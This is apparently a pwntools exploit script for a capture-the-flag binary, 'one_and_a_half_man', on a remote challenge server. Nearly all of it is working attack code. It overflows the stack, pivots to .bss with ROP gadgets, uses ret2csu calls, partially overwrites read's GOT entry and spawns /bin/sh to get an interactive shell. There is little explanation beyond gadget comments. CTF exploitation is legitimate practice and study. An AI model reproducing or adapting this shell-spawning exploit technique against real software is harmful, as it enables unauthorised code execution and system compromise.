#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenges.ctfd.io --port 30096 ./bof
from pwn import *
#import roputils as we
# Set up pwntools for the correct architecture
elf = context.binary = ELF('./one_and_a_half_man')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'one-and-a-half-man.3k.ctf.to'
port = int(args.PORT or 8521)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x4005DC
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()


bss = 0x601068 
leave_r = 0x004005db #: leave ; ret ;
pop_rdi = 0x00400693 #: pop rdi ; ret  ;
pop_rsi = 0x00400691 #: pop rsi ; pop r15 ; ret  ;
mov_r14 = 0x00400670
add_rbp = 0x00401108 
pop_r45 = 0x00400690 #: pop r14 ; pop r15 ; ret  ; 
csu = 0x040068A
init = 0x600e38
ret = 0x0040062d

rop1 = flat([
	'A'*10,bss,
	pop_rsi, bss+8, 0x0,
	elf.sym.read, leave_r
])
io.send(rop1)
pause()
rop2 = flat([
	csu, 0x0, 0x1, init, 0x0, 0x0,0x1000, mov_r14, 0x0,0x0,bss,0x0,0x0,0x0,0x0,
	pop_rsi, bss+0x98,0,
	elf.sym.read,leave_r
])

io.send(rop2)

r2 = flat([
        '/bin/sh\x00',
	pop_rsi, elf.got['read'], 0x0,
	elf.sym.read,
	csu, 0x0, 0x1, init, 0x0,0x0, (bss + 0x300), mov_r14, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
	pop_rsi, (bss + 0x300), 0x0,
	elf.sym.read,
	pop_rdi, bss+0x98,
	pop_rsi, (bss + 0x308), 0x0,
	elf.sym.read
])
pause()
io.send(r2)
pause()
print('NOW')
io.send('\x8f')
pause()
io.send(p64(0x0) + p64(bss + 0x310) + '\x00'*43)
io.interactive()
